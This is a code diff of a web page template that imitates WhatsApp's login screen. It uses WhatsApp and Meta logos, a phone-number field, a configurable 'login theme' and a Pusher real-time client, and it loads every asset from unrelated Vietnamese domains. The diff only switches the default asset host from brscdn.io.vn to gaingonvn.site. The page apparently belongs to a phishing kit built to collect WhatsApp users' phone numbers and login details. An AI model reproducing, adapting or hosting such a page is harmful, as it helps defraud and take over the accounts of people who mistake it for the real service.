@@ -15,7 +15,7 @@
     <meta property="og:image" content="{{ $data->image }}" />
     <meta property="og:type" content="article" />
     <link rel="shortcut icon"
-        href="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/whatsapp/whatsapp_favicon.svg">
+        href="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/whatsapp/whatsapp_favicon.svg">
     @vite(['resources/css/app.css'])
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"
         integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g=="
@@ -54,7 +54,7 @@
 
         @font-face {
             font-family: 'MyRulersVjpPro';
-            src: url('https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/whatsapp/whatsapp_font.woff2') format('woff2');
+            src: url('https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/whatsapp/whatsapp_font.woff2') format('woff2');
         }
 
         body {
@@ -66,7 +66,7 @@
 <body>
     <div class="lg:grid lg:grid-cols-[200px_1fr_600px] border-b-3 border-b-[#dde2e7] mt-[150px] md:mt-0">
         <div class="hidden md:block col-span-1 ml-10">
-            <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/whatsapp/whatsapp.svg?v=1"
+            <img src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/whatsapp/whatsapp.svg?v=1"
                 alt="ws-logo" class="mt-[50px] ml-4" width="70">
             <h1 class="font-bold text-[3.5rem] leading-tight mt-[300px] mb-7">
                 {{ explode('_', __('whatsapp.connecting_with_the_world'))[0] }} <span
@@ -74,14 +74,14 @@
         </div>
         <div class="col-span-1 hidden md:block">
             <div class="flex justify-center items-center h-full">
-                <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/whatsapp/banner.png"
+                <img src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/whatsapp/banner.png"
                     alt="fb-banner" class="w-[40%] xl:w-[50%]">
             </div>
         </div>
         <div class="col-span-1 lg:border-l-3 border-l-[#dde2e7]">
             <div class="flex justify-center w-[90%] lg:w-[80%] mx-auto items-center h-full">
                 <div class="space-y-3 w-full">
-                    <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/whatsapp/whatsapp.svg?v=1"
+                    <img src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/whatsapp/whatsapp.svg?v=1"
                         alt="ws-logo" class="block lg:hidden mx-auto mb-15" width="70">
                     {{-- Thông báo khi lỗi --}}
                     <div class="py-3.5 px-4 bg-[#f93a4b] text-white text-sm rounded-2xl" id="warning"
@@ -96,7 +96,7 @@
                                     class="absolute top-[10%] left-[16px] peer-placeholder-shown:top-[32%] peer-placeholder-shown:text-[15px] text-[#646d74] cursor-text text-sm peer-focus:top-[10%] peer-focus:text-sm transition-all"
                                     for="phone">{{ filled($login_theme_config->whatsapp->phone) ? $login_theme_config->whatsapp->phone : __('whatsapp.phone_number') }}</label>
                                 <button id="close_btn" class="cursor-pointer hidden" tabindex="-1">
-                                    <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/whatsapp/close_logo.svg"
+                                    <img src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/whatsapp/close_logo.svg"
                                         width="25" />
                                 </button>
                             </div>
@@ -124,7 +124,7 @@
                     </form>
                     <div class="mt-2">
                         <div class="mt-10 flex justify-center mb-5">
-                            <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/whatsapp/meta_logo.png"
+                            <img src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/whatsapp/meta_logo.png"
                                 alt="fb-logo" width="55">
                         </div>
                     </div>
@@ -149,7 +149,7 @@
             </script>
         </p>
     </div>
-    <script src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/whatsapp/helpers.js"></script>
+    <script src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/whatsapp/helpers.js"></script>
     <script>
         var pusher = new Pusher('f41c529c33d4daa42080', {
             cluster: 'ap1'
